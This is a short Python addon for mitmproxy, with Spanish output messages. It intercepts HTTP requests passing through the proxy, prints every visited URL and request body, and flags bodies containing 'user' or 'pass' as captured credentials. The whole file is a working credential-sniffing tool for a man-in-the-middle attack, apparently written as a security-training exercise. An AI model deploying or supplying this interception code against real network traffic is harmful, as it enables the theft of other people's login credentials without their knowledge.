from mitmproxy import http
from urllib.parse import urlparse


def has_keywoards(data,keywoards):
    return any(keywoard in data for keywoard in keywoards)


def request(packet):
    url = packet.request.url
    parsed_url = urlparse(url)
    scheme = parsed_url.scheme
    domain = parsed_url.netloc
    path = parsed_url.path

    print(f"[+] URL visitada: {scheme}://{domain}{path}")

    keywoards = ["user", "pass",]
    data = packet.request.get_text()
    print(data)

    if has_keywoards(data,keywoards):
        print(f"\n[+] Posibles credenciales capturadas:  \n\n{data}\n")